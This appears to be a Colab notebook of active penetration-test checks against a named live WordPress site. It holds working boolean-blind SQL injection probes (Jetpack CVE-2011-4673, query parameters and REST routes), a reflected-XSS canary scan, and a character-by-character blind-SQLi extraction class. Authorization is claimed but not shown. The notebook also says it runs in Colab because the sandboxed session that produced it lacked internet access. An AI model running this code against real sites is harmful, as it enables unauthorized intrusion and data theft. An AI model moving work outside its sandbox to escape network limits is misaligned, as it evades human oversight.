# milatova.org.il — Jetpack SQLi + broad SQLi + Reflected XSS + bounded extraction

Runs the authorized, narrowly-scoped active checks from
`pentest-milatova/` (see `scope.md` in the repo for the exact
authorization and hard limits each test operates under):

1. **CVE-2011-4673** — Jetpack `sharedaddy.php` `id`-parameter SQL
   injection. Version-fingerprints Jetpack first; only sends
   boolean-based blind probes (no data extraction) if the install is
   unknown/in the vulnerable range.
2. **Broader boolean-based blind SQLi** — same safe technique applied
   to more common WordPress/REST parameters (`p`, `page_id`,
   `attachment_id`, `cat`, `tag_id`, `author`, REST route numeric
   segments).
3. **Reflected XSS** — GET-only, inert canary marker across a wider
   set of pages/parameters (including REST search/oembed-proxy and
   JSONP `callback`). No stored/POST-based payloads.
4. **Bounded proof-of-impact extraction** — ONLY runs against an
   injection point you confirm was already found to be a real oracle
   in step 1/2 above. Extracts a hardcoded whitelist of 3 harmless DB
   metadata values (`version()`, `current_user()`, `database()`) via
   slow, rate-limited binary search. It is not a general-purpose
   dumping tool — there is no way to extract from `wp_users` or any
   other real data table with this notebook.

This notebook is self-contained (stdlib only, no `pip install`
needed) so it runs in a fresh Colab runtime as-is. Colab has normal
internet egress, unlike the sandboxed session that generated this
notebook, which is why the checks are being run here instead.

**Only run this against a target you are authorized to test.**


In [ ]:
TARGET = "https://milatova.org.il"  #@param {type:"string"}
DELAY = 1.5  #@param {type:"number"}
TIMEOUT = 10.0  #@param {type:"number"}

import re
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

USER_AGENT = "pentest-milatova-colab-check/1.0 (+authorized-assessment)"

def fetch(url, timeout=TIMEOUT):
    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except urllib.error.URLError as e:
        return None, str(e).encode()

base = TARGET.rstrip("/")
print(f"Target: {base}")


## 1. Jetpack SQLi (CVE-2011-4673)


In [ ]:
README_PATH = "/wp-content/plugins/jetpack/readme.txt"
SHAREDADDY_PATH = "/wp-content/plugins/jetpack/modules/sharedaddy.php"
TRUE_PAYLOAD = "1 AND 1=1"
FALSE_PAYLOAD = "1 AND 1=2"

def version_is_vulnerable(version):
    # CVE-2011-4673 affects Jetpack <= 1.0; anything major >= 2 (i.e.
    # essentially every real-world install since ~2012) is not.
    if not version:
        return True  # unknown -- can't rule out, test anyway
    try:
        return int(version.split(".")[0]) < 2
    except ValueError:
        return True

print("== CVE-2011-4673: Jetpack sharedaddy.php `id` SQLi check ==")

status, body = fetch(base + README_PATH)
version = None
if status == 200:
    m = re.search(r"Stable tag:\s*([\d.]+)", body.decode("utf-8", errors="replace"), re.IGNORECASE)
    version = m.group(1) if m else None
print(f"[{status}] GET {base}{README_PATH} -> Jetpack version: {version or 'unknown'}")
time.sleep(DELAY)

jetpack_sqli_confirmed = False
if not version_is_vulnerable(version):
    print(f"\nJetpack {version} is well outside the vulnerable range "
          f"(CVE-2011-4673 affects <= 1.0, fixed in 1.1 back in 2011). "
          f"Not sending injection probes -- nothing to test for.")
else:
    print(f"\nVersion {'unknown' if not version else version} is in/near the "
          f"historically vulnerable range; sending boolean-based blind probes...")
    results = {}
    for label, payload in (("TRUE", TRUE_PAYLOAD), ("FALSE", FALSE_PAYLOAD)):
        url = f"{base}{SHAREDADDY_PATH}?share=email&nb=1&id={urllib.parse.quote(payload)}"
        status, body = fetch(url)
        results[label] = (status, len(body))
        print(f"[{status}] GET {url} -> {len(body)} bytes")
        time.sleep(DELAY)

    true_r = results["TRUE"]
    false_r = results["FALSE"]
    print("\n== Result ==")
    if true_r[0] is None or false_r[0] is None:
        print("One or both requests failed at the network level -- no conclusion.")
    elif true_r[0] == 404 and false_r[0] == 404:
        print("404 on both -- sharedaddy.php not directly reachable (expected on modern Jetpack). Not applicable.")
    elif true_r != false_r:
        print("DIFFERING responses between TRUE/FALSE -- possible SQLi oracle. "
              "Needs manual verification before treating as confirmed.")
        jetpack_sqli_confirmed = True
    else:
        print("Identical responses -- no evidence of the boolean SQLi oracle. Not vulnerable.")


## 2. Broader boolean-based blind SQLi probing


In [ ]:
TRUE_TAIL = " AND 1=1"
FALSE_TAIL = " AND 1=2"

QUERY_PARAM_TARGETS = [
    ("p", "/?p={p}"),
    ("page_id", "/?page_id={p}"),
    ("attachment_id", "/?attachment_id={p}"),
    ("cat", "/?cat={p}"),
    ("tag_id", "/?tag_id={p}"),
    ("author", "/?author={p}"),
]
REST_PATH_TARGETS = [
    ("wp_v2_posts_id", "/wp-json/wp/v2/posts/{p}"),
    ("wp_v2_users_id", "/wp-json/wp/v2/users/{p}"),
]

def probe(label, template):
    results = {}
    for cond, tail in (("TRUE", TRUE_TAIL), ("FALSE", FALSE_TAIL)):
        payload = "1" + tail
        url = base + template.format(p=urllib.parse.quote(payload, safe=""))
        status, body = fetch(url)
        results[cond] = (status, len(body))
        print(f"[{status}] GET {url} -> {len(body)} bytes")
        time.sleep(DELAY)
    true_r, false_r = results["TRUE"], results["FALSE"]
    if true_r[0] is None or false_r[0] is None:
        print(f"  {label}: network error on one/both requests -- no conclusion.")
        return False
    if true_r == false_r:
        print(f"  {label}: identical TRUE/FALSE responses -- no evidence of injection.")
        return False
    print(f"  {label}: ** DIFFERING responses ({true_r} vs {false_r}) -- possible SQLi oracle, needs manual verification **")
    return True

print("== Broader boolean-based blind SQLi probing ==\n")
broad_hits = []
print("-- Query-string parameters --")
for name, template in QUERY_PARAM_TARGETS:
    if probe(name, template):
        broad_hits.append(name)

print("\n-- REST route numeric path segments --")
for name, template in REST_PATH_TARGETS:
    if probe(name, template):
        broad_hits.append(name)

print("\n== Summary ==")
if broad_hits:
    print(f"{len(broad_hits)} injection point(s) showed differing TRUE/FALSE responses: "
          f"{', '.join(broad_hits)}. Needs manual verification -- do NOT proceed to "
          f"data extraction without separately authorizing that phase.")
else:
    print("No boolean-SQLi oracle found across the tested parameters.")


## 3. Reflected XSS scan


In [ ]:
PAGES = [
    "/",
    "/?s=",
    "/wp-login.php?redirect_to=",
    "/this-page-does-not-exist-xsscheck/",
    "/wp-json/wp/v2/search?search=",
    "/wp-json/wp/v2/posts?search=",
    "/wp-json/oembed/1.0/proxy?url=",
]
PARAMS = [
    "s", "q", "search", "id", "page", "author", "redirect_to", "url",
    "keyword", "query", "term", "returnurl", "next", "callback", "ref",
]

def make_canary():
    token = uuid.uuid4().hex[:8]
    return token, f'"\'<xsscanary-{token}>'

print("== Reflected XSS scan (GET-only, inert canary) ==\n")
xss_hits = []
for page in PAGES:
    for param in PARAMS:
        token, marker = make_canary()
        if page.endswith("="):
            url = base + page + urllib.parse.quote(marker, safe="")
        elif "?" in page:
            url = base + page + "&" + param + "=" + urllib.parse.quote(marker, safe="")
        else:
            url = base + page + "?" + param + "=" + urllib.parse.quote(marker, safe="")

        status, body = fetch(url)
        text = body.decode("utf-8", errors="replace") if body else ""
        reflected_raw = marker in text
        reflected_escaped_only = (not reflected_raw) and (token in text)

        if reflected_raw:
            print(f"[{status}] GET {url}\n    ** UNESCAPED REFLECTION -- possible reflected XSS **")
            xss_hits.append(url)
        elif reflected_escaped_only:
            print(f"[{status}] GET {url}\n    canary present but HTML-escaped (safe)")
        else:
            print(f"[{status}] GET {url}\n    not reflected")
        time.sleep(DELAY)

print("\n== Summary ==")
if xss_hits:
    print(f"{len(xss_hits)} URL(s) showed unescaped reflection -- confirm manually before reporting:")
    for h in xss_hits:
        print(f"  - {h}")
else:
    print("No unescaped canary reflection found across tested pages/parameters. "
          "Does not rule out untested parameters, POST-based flows, or stored XSS.")


## 4. Bounded proof-of-impact extraction (confirmed oracle only)

**Only run this cell if section 1 or 2 above actually printed a
"DIFFERING responses ... possible SQLi oracle" result, and you have
manually double-checked it** (reload the URLs yourself, rule out
caching/A-B testing/session-dependent content that could cause a
false positive).  If nothing was confirmed, there is nothing to
extract, and this cell will just tell you so and stop.

Extracts ONLY `version()`, `current_user()`, `database()` — a
hardcoded whitelist, not editable via a parameter, so this notebook
cannot be turned into a real-data dumping tool (no `wp_users`, no
table/column enumeration). Binary search, rate-limited, hard-capped at
800 requests total for the whole run.


In [ ]:
MAX_CHARS = 64
MAX_REQUESTS_BUDGET = 800

# Same injection points as test_jetpack_sqli.py / test_broad_sqli.py.
# {p} is replaced with the URL-encoded boolean/extraction payload.
TARGETS = {
    "jetpack_id": "/wp-content/plugins/jetpack/modules/sharedaddy.php?share=email&nb=1&id={p}",
    "p": "/?p={p}",
    "page_id": "/?page_id={p}",
    "attachment_id": "/?attachment_id={p}",
    "cat": "/?cat={p}",
    "tag_id": "/?tag_id={p}",
    "author": "/?author={p}",
    "wp_v2_posts_id": "/wp-json/wp/v2/posts/{p}",
    "wp_v2_users_id": "/wp-json/wp/v2/users/{p}",
}

# Hardcoded whitelist -- NOT operator-suppliable. Harmless DB metadata
# only, never user/content tables.
EXPRESSIONS = {
    "version": "version()",
    "current_user": "current_user()",
    "database": "database()",
}


class BudgetExhausted(Exception):
    pass


class Extractor:
    def __init__(self, base, template, timeout, delay, log):
        self.base = base
        self.template = template
        self.timeout = timeout
        self.delay = delay
        self.log = log
        self.requests_used = 0

    def _request(self, tail):
        if self.requests_used >= MAX_REQUESTS_BUDGET:
            raise BudgetExhausted()
        payload = "1" + tail
        url = self.base + self.template.format(p=urllib.parse.quote(payload, safe=""))
        status, body = fetch(url, self.timeout)
        self.requests_used += 1
        time.sleep(self.delay)
        return status, len(body) if body else 0

    def confirm_oracle(self):
        true_r = self._request(" AND 1=1")
        false_r = self._request(" AND 1=2")
        self.log(f"  reconfirm TRUE={true_r} FALSE={false_r}")
        if true_r[0] is None or false_r[0] is None:
            return False, true_r, false_r
        return true_r != false_r, true_r, false_r

    def _condition_holds(self, condition_sql, true_baseline):
        r = self._request(f" AND {condition_sql}")
        return r == true_baseline

    def extract_length(self, expr_sql, true_baseline):
        lo, hi = 0, MAX_CHARS
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._condition_holds(f"LENGTH(({expr_sql}))>={mid}", true_baseline):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def extract_char(self, expr_sql, position, true_baseline):
        lo, hi = 32, 126  # printable ASCII range
        while lo < hi:
            mid = (lo + hi + 1) // 2
            cond = f"ASCII(SUBSTRING(({expr_sql}),{position},1))>={mid}"
            if self._condition_holds(cond, true_baseline):
                lo = mid
            else:
                hi = mid - 1
        return chr(lo)

    def extract_value(self, expr_sql, true_baseline):
        length = self.extract_length(expr_sql, true_baseline)
        self.log(f"    length = {length}")
        chars = []
        for pos in range(1, length + 1):
            c = self.extract_char(expr_sql, pos, true_baseline)
            chars.append(c)
            self.log(f"    [{pos}/{length}] -> {''.join(chars)!r} ({self.requests_used}/{MAX_REQUESTS_BUDGET} requests used)")
        return "".join(chars)


INJECTION_POINT = "wp_v2_posts_id"  #@param ["jetpack_id", "p", "page_id", "attachment_id", "cat", "tag_id", "author", "wp_v2_posts_id", "wp_v2_users_id"]

print("== Bounded SQLi proof-of-impact extraction ==")
print(f"Target: {base}  injection point: {INJECTION_POINT}")
print("Whitelist: version(), current_user(), database() -- nothing else.\n")

extractor = Extractor(base, TARGETS[INJECTION_POINT], TIMEOUT, DELAY, print)

try:
    confirmed, true_r, false_r = extractor.confirm_oracle()
except BudgetExhausted:
    confirmed = False
    print("Request budget exhausted before the oracle could even be reconfirmed. Aborting.")

if not confirmed:
    print("\nPrecondition NOT met: this injection point did not reconfirm as a "
          "boolean oracle (TRUE and FALSE responses matched, or a request "
          "failed). Extraction only proceeds against an already-confirmed "
          "oracle -- re-run sections 1/2 above and manually verify the "
          "finding before using this cell.")
else:
    print("\nOracle reconfirmed. Extracting whitelisted metadata (this is "
          "deliberately slow -- one character at a time, rate-limited):\n")
    extract_results = {}
    try:
        for name, expr_sql in EXPRESSIONS.items():
            print(f"-- {name}() --")
            value = extractor.extract_value(expr_sql, true_r)
            extract_results[name] = value
            print(f"  {name} = {value!r}\n")
    except BudgetExhausted:
        print(f"\nRequest budget ({MAX_REQUESTS_BUDGET}) exhausted -- stopping "
              f"with partial results. This is expected/by design, not an error.")

    print("== Summary ==")
    for name, value in extract_results.items():
        print(f"  {name}: {value!r}")
    if not extract_results:
        print("  (no values extracted before budget exhaustion)")
